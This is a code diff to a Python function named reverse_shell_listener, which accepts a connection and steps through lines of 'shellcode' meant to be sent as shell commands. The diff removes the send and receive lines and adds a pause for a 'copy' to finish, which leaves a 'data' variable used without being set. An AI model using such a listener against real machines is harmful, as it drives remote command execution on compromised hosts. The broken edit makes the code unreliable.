@@ -46,14 +46,12 @@ def reverse_shell_listener():
 		s.listen(10) # Listen for only 10 unaccepted connections.
 		conn, addr = s.accept() # Accept connections.
 		print("[+] Connected by", addr) # Print connected by ipaddress.
-		data = recv_timeout(conn)
 		codelines=shellcode.split("\n")
 		for line in codelines:
 			print("Sending: " + line)
-			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
-			data = recv_timeout(conn) # Receive output from command.
 			print(data) # Print the output of the command.
 		print("Letting copy finish")
+		sleep(5)
 		print("Copy should have finished")
 		s.close()
 	except KeyboardInterrupt: 
